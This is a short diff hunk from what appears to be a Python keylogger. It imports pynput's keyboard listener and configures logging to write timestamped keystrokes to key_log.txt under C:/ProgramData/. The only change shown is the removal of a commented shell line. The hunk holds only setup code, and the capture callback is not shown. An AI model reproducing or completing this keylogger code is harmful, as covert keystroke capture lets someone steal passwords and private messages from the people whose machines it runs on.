@@ -2,7 +2,6 @@ from pynput.keyboard import Key, Listener
 import logging
 
 log_dir = "C:/ProgramData/"
-# cd $env:USERPROFILE
 
 logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
